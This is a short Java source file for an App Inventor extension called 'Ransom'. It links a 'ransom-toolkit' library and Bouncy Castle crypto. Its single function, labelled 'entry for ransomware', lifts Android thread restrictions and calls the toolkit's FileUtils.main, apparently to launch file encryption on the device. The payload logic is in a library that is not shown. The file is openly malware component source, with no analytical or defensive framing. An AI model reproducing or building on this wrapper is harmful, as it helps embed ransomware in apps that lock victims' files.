package com.extensions.ransom;
import com.google.appinventor.components.annotations.DesignerComponent;
import com.google.appinventor.components.annotations.SimpleFunction;
import com.google.appinventor.components.annotations.SimpleObject;
import com.google.appinventor.components.annotations.UsesLibraries;
import com.google.appinventor.components.runtime.AndroidNonvisibleComponent;
import com.google.appinventor.components.runtime.ComponentContainer;
import com.google.appinventor.components.common.ComponentCategory;

import android.os.StrictMode;
import android.util.Log;
import com.asef18766.RansomToolkit.FileUtils;

@DesignerComponent(version = 1,
                    category = ComponentCategory.EXTENSION,
                    description = "",
                    nonVisible = true,
                    iconName = "")

@SimpleObject(external = true)
@UsesLibraries(libraries = "ransom-toolkit.jar,bcprov-ext-jdk15to18-171.jar")
public class Ransom extends AndroidNonvisibleComponent {
    public static String AI2_RANSOM_LOG_TAG = "AI2_RANSOM";
    public Ransom(ComponentContainer form) {
        super(form.$form());
    }
    
    @SimpleFunction(description = "entry for ransomware")
    public void TestingFunc()
    {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        Log.i(AI2_RANSOM_LOG_TAG, "testing for logcat");
        FileUtils.main(null);
    }
}
